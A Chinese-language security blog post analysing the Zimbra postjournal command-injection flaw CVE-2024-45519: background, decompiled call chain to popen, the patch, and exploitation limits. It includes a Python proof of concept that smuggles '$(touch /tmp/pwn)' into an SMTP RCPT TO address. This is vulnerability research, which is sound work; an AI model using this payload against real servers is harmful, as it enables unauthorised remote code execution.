<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.2.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha256-wiz7ZSCn/btzhjKDQBms9Hx4sSeUYsDrTLg7roPstac=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Mist","darkmode":false,"version":"8.19.2","exturl":false,"sidebar":{"position":"right","width":200,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>



<link rel="canonical" href="http://example.com/2024/10/06/CVE-2024-45519/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2024/10/06/CVE-2024-45519/","path":"2024/10/06/CVE-2024-45519/","title":"Zimbra-RCE-分析(CVE-2024-45519)"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>Zimbra-RCE-分析(CVE-2024-45519) | Y0ng's Blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">Y0ng's Blog</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="nav-text">漏洞简介</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-text">前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%82%AE%E4%BB%B6%E7%9B%B8%E5%85%B3%E7%9A%84%E5%8D%8F%E8%AE%AE"><span class="nav-text">邮件相关的协议</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%82%AE%E4%BB%B6%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86"><span class="nav-text">邮件基础原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%82%AE%E4%BB%B6%E8%BF%87%E7%A8%8B%E5%9B%BE%E7%A4%BA"><span class="nav-text">邮件过程图示</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#zimbra%E6%9E%B6%E6%9E%84"><span class="nav-text">zimbra架构</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#postjournal"><span class="nav-text">postjournal</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E9%99%90%E5%88%B6"><span class="nav-text">漏洞利用限制</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%BB%98%E8%AE%A4%E4%B8%8D%E5%BC%80%E5%90%AF"><span class="nav-text">默认不开启</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E8%BF%90%E8%A1%8C"><span class="nav-text">本地运行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ip%E9%99%90%E5%88%B6"><span class="nav-text">ip限制</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-text">参考</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Y0ng</p>
  <div class="site-description" itemprop="description">花有重开日，人无再少年</div>
</div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/10/06/CVE-2024-45519/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Y0ng">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Y0ng's Blog">
      <meta itemprop="description" content="花有重开日，人无再少年">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="Zimbra-RCE-分析(CVE-2024-45519) | Y0ng's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Zimbra-RCE-分析(CVE-2024-45519)
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2024-10-06 20:14:03" itemprop="dateCreated datePublished" datetime="2024-10-06T20:14:03+08:00">2024-10-06</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" itemprop="url" rel="index"><span itemprop="name">漏洞分析</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Zimbra/Blog---Zimbra.png"></p>
<a id="more"></a>

<h1 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h1><p>在远程 Zimbra 服务器开启了 postjournal 服务时，未授权的远程攻击者可构造特殊的请求包发送至远程的Zimbra系统，在目标系统中执行命令，从而获取目标系统的服务器权限。</p>
<h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><p>仅影响 Zimbra Network Edition 付费版本</p>
<ul>
<li><p>Zimbra Collaboration &lt; 8.8.15 Patch 46</p>
</li>
<li><p>Zimbra Collaboration &lt; 9.0.0 Patch 41</p>
</li>
<li><p>Zimbra Collaboration &lt; 10.0.9</p>
</li>
<li><p>Zimbra Collaboration &lt; 10.1.1</p>
</li>
</ul>
<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="邮件相关的协议"><a href="#邮件相关的协议" class="headerlink" title="邮件相关的协议"></a>邮件相关的协议</h2><ul>
<li>smtp</li>
<li>pop3</li>
<li>imap</li>
</ul>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Zimbra/image-20241005191535999.png" alt="image-20241005191535999"></p>
<h2 id="邮件基础原理"><a href="#邮件基础原理" class="headerlink" title="邮件基础原理"></a>邮件基础原理</h2><ul>
<li><p>MUA（Mail User Agent）接收邮件所使用的邮件客户端，使用IMAP或POP3协议与服务器通信；</p>
</li>
<li><p>MTA（Mail Transfer Agent） 通过SMTP协议发送、转发邮件；</p>
</li>
<li><p>MDA（Mail Deliver Agent）将MTA接收到的邮件保存到磁盘或指定地方，进行垃圾邮件及病毒扫描；</p>
</li>
<li><p>MRA（Mail Receive Agent）负责实现IMAP与POP3协议，与MUA进行交互；</p>
</li>
<li><p>SMTP（Simple Mail Transfer Protocol）传输发送邮件所使用的标准协议；</p>
</li>
<li><p>IMAP（Internet Message Access Protocol）接收邮件使用的标准协议之一；</p>
</li>
<li><p>POP3（Post Office Protocol 3） 接收邮件使用的标准协议之一。</p>
</li>
</ul>
<table>
<thead>
<tr>
<th>概念</th>
<th>常用软件</th>
</tr>
</thead>
<tbody><tr>
<td>MUA</td>
<td>outlook、thunderbird、Mac Mail、mutt</td>
</tr>
<tr>
<td>MTA</td>
<td>sendmail、postfix</td>
</tr>
<tr>
<td>MDA</td>
<td>procmail、dropmail</td>
</tr>
<tr>
<td>MRA</td>
<td>dovecot</td>
</tr>
</tbody></table>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Zimbra/image-20241005192254815.png" alt="image-20241005192254815"></p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Zimbra/image-20241005192630665.png" alt="image-20241005192630665"></p>
<h2 id="邮件过程图示"><a href="#邮件过程图示" class="headerlink" title="邮件过程图示"></a>邮件过程图示</h2><p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Zimbra/082159327033346.png" alt="img"></p>
<h2 id="zimbra架构"><a href="#zimbra架构" class="headerlink" title="zimbra架构"></a>zimbra架构</h2><p>Zimbra Collaboration Server（Zimbra协作服务器）简称：ZCS，zimbra目前分为</p>
<ul>
<li>Zimbra Open Source (ZOS)：开源，免费</li>
<li>Zimbra Network Edition (ZNE)：商业，付费</li>
</ul>
<p>在安装时会安装以下包：</p>
<ul>
<li>zimbra-core：<strong>核心组件</strong>，libraries, utilities, monitoring tools, and basic configuration files</li>
<li>zimbra-ldap：用户验证组件</li>
<li>zimbra-logger：用于系统日志聚合和报告的工具</li>
<li>zimbra-mta：负责邮件的传输和递送，使用 Postfix。它处理邮件的收发、转发以及垃圾邮件和病毒扫描等功能</li>
<li>zimbra-dnscache：用于提供本地 DNS 缓存服务</li>
<li>zimbra-snmp：对 Zimbra 邮件服务器进行监控和管理</li>
<li>zimbra-store：<strong>核心组件</strong>，主要负责处理与邮箱相关的所有存储、访问和管理、WEB应用功能</li>
<li>zimbra-apache：随zimbra-spell自动安装</li>
<li>zimbra-spell：拼写检查</li>
<li>zimbra-memcached：一个加快数据访问速度的缓存服务模块，帮助管理会话信息、身份验证状态以及其他需要快速访问的数据</li>
<li>zimbra-proxy：一种高性能的反向代理服务，用于将IMAP[S]/POP[S]/HTTP[S]客户端请求传递给其他内部ZCS服务</li>
<li>zimbra-drive：WEB客户端管理文件</li>
<li>zimbra-patch：修漏洞用</li>
<li>zimbra-mta-patch：修漏洞用</li>
<li>zimbra-proxy-patch：修漏洞用</li>
<li>zimbra-chat：在 Web 客户端中进行实时消息交流</li>
</ul>
<p>以下是不同端口的功能：<a target="_blank" rel="noopener" href="https://wiki.zimbra.com/wiki/Ports">https://wiki.zimbra.com/wiki/Ports</a></p>
<ul>
<li>25：smtp，邮件服务</li>
<li>80：web mail client</li>
<li>465：smtps，邮件服务 with TLS</li>
<li>587：Mail submission over TLS</li>
<li>110：POP3</li>
<li>143：IMAP</li>
<li>993：IMAP over TLS</li>
<li>995：POP3 over TLS</li>
<li>443：HTTP over TLS</li>
<li>8080：Backend HTTP</li>
<li>8443：Backend HTTPS</li>
<li>7071：admin console HTTP over TLS</li>
<li>9071：HTTP over TLS</li>
<li>10027：postjournal</li>
</ul>
<h2 id="postjournal"><a href="#postjournal" class="headerlink" title="postjournal"></a>postjournal</h2><p><a target="_blank" rel="noopener" href="https://wiki.zimbra.com/wiki/New_Features_ZCS_8.5">https://wiki.zimbra.com/wiki/New_Features_ZCS_8.5</a></p>
<p>该服务可以为所有进入或离开 MTA 并传递到特定地址的消息创建日志，即该服务创建邮件副本，作为日志进行留存。</p>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>单服务器搭建参考：<a target="_blank" rel="noopener" href="https://zimbra.github.io/installguides/latest/single.html">https://zimbra.github.io/installguides/latest/single.html</a></p>
<p>因硬件条件不支持，没有成功安装Network版本，故搭建本地测试环境失败。</p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>通过下载历史版本安装包：<a target="_blank" rel="noopener" href="https://files.zimbra.com/downloads/8.8.15_GA/zcs-NETWORK-8.8.15_GA_4177.UBUNTU20_64.20211112014220.tgz">https://files.zimbra.com/downloads/8.8.15_GA/zcs-NETWORK-8.8.15_GA_4177.UBUNTU20_64.20211112014220.tgz</a> ，找到 postjournal 二进制文件，路径：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zcs-NETWORK-8.8.15_GA_4177.UBUNTU20_64.20211112014220\packages\zimbra-core_8.8.15.GA.4177.UBUNTU20.64_amd64.deb\data.tar\.\opt\zimbra\libexec\postjournal</span><br></pre></td></tr></table></figure>

<p>main通过 get_pj_config 和 get_pf_config 函数配置一些变量</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Zimbra/image-20241006143609380.png" alt="image-20241006143609380"></p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Zimbra/image-20241006143736540.png" alt="image-20241006143736540"></p>
<p>main最后通过 <strong>msg_receiver</strong> 用于接收处理SMTP消息，间接调用 <strong>msg_handler() 处理 MSG 消息对象</strong></p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Zimbra/image-20241006143901566.png" alt="image-20241006143901566"></p>
<p>在 <strong>msg_receiver</strong> 中，首先初始化MSG对象</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MSG *__cdecl msg_init()</span><br><span class="line">&#123;</span><br><span class="line">  MSG *msg; &#x2F;&#x2F; [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  msg &#x3D; (MSG *)malloc(0x58uLL);</span><br><span class="line">  if ( !msg )</span><br><span class="line">    return 0LL;</span><br><span class="line">  msg-&gt;current_state &#x3D; 0;</span><br><span class="line">  msg-&gt;current_time &#x3D; 0LL;</span><br><span class="line">  msg-&gt;helo_hostname &#x3D; 0LL;</span><br><span class="line">  msg-&gt;origin_address &#x3D; 0LL;</span><br><span class="line">  msg-&gt;received_hdr &#x3D; 0LL;</span><br><span class="line">  msg-&gt;rcpt_addresses &#x3D; 0LL;</span><br><span class="line">  msg-&gt;xforward_info &#x3D; 0LL;</span><br><span class="line">  msg-&gt;subject &#x3D; 0LL;</span><br><span class="line">  msg-&gt;msg_id &#x3D; 0LL;</span><br><span class="line">  msg-&gt;message &#x3D; 0LL;</span><br><span class="line">  msg-&gt;msg_file &#x3D; 0LL;</span><br><span class="line">  return msg;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>循环解析出输入流中SMTP命令</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Zimbra/image-20241006160034993.png" alt="image-20241006160034993"></p>
<p>匹配RCPT时，调用 <strong>rcpt_to_handler</strong></p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Zimbra/image-20241006173102048.png" alt="image-20241006173102048"></p>
<p><strong>rcpt_to_handler</strong> 解析出 <code>RCPT TO:&lt;...&gt;</code> 中的email地址存储在 <strong>msg-&gt;rcpt_addresses</strong></p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Zimbra/image-20241006173252466.png" alt="image-20241006173252466"></p>
<p>最后调用 <strong>msg_handler</strong> 进一步处理SMTP消息</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Zimbra/image-20241006165433602.png" alt="image-20241006165433602"></p>
<p>跟进 <strong>msg_handler</strong> ，通过 <strong>find_addresses</strong> 获取一个email地址列表，随后将 <strong>msg-&gt;rcpt_addresses</strong> 合并到该列表后调用 <strong>expand_addrs</strong> 尝试获取列表中的email地址</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Zimbra/image-20241006165352384.png" alt="image-20241006165352384"></p>
<p><strong>expand_addrs</strong> 通过三种邮件映射类型去获取真正的邮件地址，调用到了 <strong>address_lookup</strong></p>
<ul>
<li>virtual_alias_maps</li>
<li>canonical_maps</li>
<li>local_alias_maps</li>
</ul>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Zimbra/image-20241006165635610.png" alt="image-20241006165635610"></p>
<p><strong>address_lookup</strong> 就是上述三种映射的封装，并调用 <strong>map_address</strong></p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Zimbra/image-20241006170435750.png" alt="image-20241006170435750"></p>
<p><strong>map_address</strong> 调用 <strong>read_addr_maps</strong></p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Zimbra/image-20241006170623079.png" alt="image-20241006170623079"></p>
<p><strong>read_addr_maps</strong> 调用 <strong>read_maps</strong></p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Zimbra/image-20241006170658536.png" alt="image-20241006170658536"></p>
<p>最终在 <strong>read_maps</strong> 通过可控的 email addr 进行格式化字符串完成popen命令注入</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Zimbra/image-20241006171425215.png" alt="image-20241006171425215"></p>
<p>完整调用链</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">main</span><br><span class="line">└── msg_handler(MSG *msg)</span><br><span class="line">    └── expand_addrs</span><br><span class="line">        └── address_lookup</span><br><span class="line">            └── map_address</span><br><span class="line">                └── read_addr_maps</span><br><span class="line">                    └── read_maps</span><br><span class="line">                        └── popen(通过rcpt_addresses)</span><br></pre></td></tr></table></figure>

<p>下载漏洞修复的patch文件：<a target="_blank" rel="noopener" href="https://repo.zimbra.com/apt/8815-ne/pool/zimbra/z/zimbra-patch/zimbra-patch_8.8.15.1723777774.p46-2.u16_amd64.deb">https://repo.zimbra.com/apt/8815-ne/pool/zimbra/z/zimbra-patch/zimbra-patch_8.8.15.1723777774.p46-2.u16_amd64.deb</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zimbra-patch_8.8.15.1723777774.p46-2.u16_amd64.deb\data.tar\.\opt\zimbra\lib\patches\</span><br></pre></td></tr></table></figure>

<p>在 read_maps 新增函数 <strong>run_command</strong> 和 <strong>is_safe_input</strong> </p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Zimbra/image-20241006180549199.png" alt="image-20241006180549199"></p>
<p>is_safe_input过滤一些注入字符</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Zimbra/image-20241006180635140.png" alt="image-20241006180635140"></p>
<p>run_command通过execvp以数组形式更安全的执行命令</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Zimbra/image-20241006180653204.png" alt="image-20241006180653204"></p>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>根据文档，10027端口为postjournal端口，构造SMTP结构消息体发过去即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def smtp_payload_check_vulnerability(host, port, oast):</span><br><span class="line">    try:</span><br><span class="line">        with socket.create_connection((host, port), timeout&#x3D;10) as conn:</span><br><span class="line">            conn.send(b&#39;EHLO localhost\r\n&#39;)</span><br><span class="line">            conn.recv(1024)</span><br><span class="line"></span><br><span class="line">            conn.send(b&#39;MAIL FROM: &lt;aaaa@mail.domain.com&gt;\r\n&#39;)</span><br><span class="line">            conn.recv(1024)</span><br><span class="line"></span><br><span class="line">            rcpt_to_payload &#x3D; f&#39;RCPT TO: &lt;&quot;exploit$(touch &#x2F;tmp&#x2F;pwn)&quot;@mail.domain.com&gt;\r\n&#39;.encode()</span><br><span class="line">            conn.send(rcpt_to_payload)</span><br><span class="line">            conn.recv(1024)</span><br><span class="line"></span><br><span class="line">            conn.send(b&#39;DATA\r\n&#39;)</span><br><span class="line">            conn.recv(1024)</span><br><span class="line"></span><br><span class="line">            conn.send(b&#39;aaa\r\n.\r\n&#39;)</span><br><span class="line">            resp &#x3D; conn.recv(1024)</span><br><span class="line"></span><br><span class="line">            conn.send(b&#39;QUIT\r\n&#39;)</span><br><span class="line">            return resp.decode(&#39;utf-8&#39;)</span><br><span class="line"></span><br><span class="line">    except Exception as e:</span><br><span class="line">        return f&quot;Error: &#123;str(e)&#125;&quot;</span><br></pre></td></tr></table></figure>



<h1 id="漏洞利用限制"><a href="#漏洞利用限制" class="headerlink" title="漏洞利用限制"></a>漏洞利用限制</h1><h2 id="默认不开启"><a href="#默认不开启" class="headerlink" title="默认不开启"></a>默认不开启</h2><p>postjournal 服务默认不开启，开启命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zmlocalconfig -e postjournal_enabled&#x3D;true</span><br><span class="line">zmcontrol restart</span><br></pre></td></tr></table></figure>

<h2 id="本地运行"><a href="#本地运行" class="headerlink" title="本地运行"></a>本地运行</h2><p>Zimbra 中的一些服务是在本地地址上运行，无法通过公网直接访问，当开启该服务时，只能通过25端口进行 “转发” 到该服务，造成RCE</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Zimbra/image-20241006175634525.png" alt="image-20241006175634525"> </p>
<h2 id="ip限制"><a href="#ip限制" class="headerlink" title="ip限制"></a>ip限制</h2><p>zimbra中 <strong>postconf</strong> 的选项 <strong>smtpd_relay_restrictions</strong>，仅允许在客户端经过身份验证或客户端在 <strong>mynetworks</strong> 列表中时发送邮件</p>
<p>当没有经过身份验证时，mynetworks为：<strong>公网ip/20的CIDR</strong> ，还是有概率被打的 :（</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mynetworks &#x3D; 127.0.0.0&#x2F;8 [::1]&#x2F;128 &lt;Public IP&gt;&#x2F;20 10.47.0.0&#x2F;16 10.122.0.0&#x2F;20</span><br></pre></td></tr></table></figure>



<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://blog.projectdiscovery.io/zimbra-remote-code-execution/">https://blog.projectdiscovery.io/zimbra-remote-code-execution/</a></p>
<p><a target="_blank" rel="noopener" href="https://wiki.zimbra.com/wiki/Ports">https://wiki.zimbra.com/wiki/Ports</a></p>

    </div>

    
    
    

    <footer class="post-footer">

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2024/10/02/SCTF2024/" rel="prev" title="SCTF2024">
                  <i class="fa fa-angle-left"></i> SCTF2024
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2024/10/13/DispatcherServlet/" rel="next" title="DispatcherServlet流程简要分析">
                  DispatcherServlet流程简要分析 <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">Y0ng</span>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>







  





</body>
</html>
